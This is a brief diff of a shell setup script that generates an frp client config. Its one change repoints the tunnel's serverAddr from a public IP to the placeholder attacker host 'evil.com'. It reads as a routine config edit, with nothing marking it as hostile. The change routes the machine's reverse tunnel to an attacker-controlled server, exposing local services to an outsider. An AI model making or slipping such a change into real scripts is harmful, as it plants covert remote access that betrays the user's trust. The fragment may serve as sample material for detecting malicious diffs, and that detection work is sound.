@@ -66,7 +66,7 @@ echo "Generating config ..."
 mkdir -p "$HOME/.frp"
 cp "$HOME/.local/frp/frpc.toml" "$HOME/.frp/frpc.toml"
 cat << 'EOF' > "$HOME/.frp/frpc.toml"
-serverAddr = "1.1.1.1"
+serverAddr = "evil.com"
 serverPort = 7000
 
 [[proxies]]
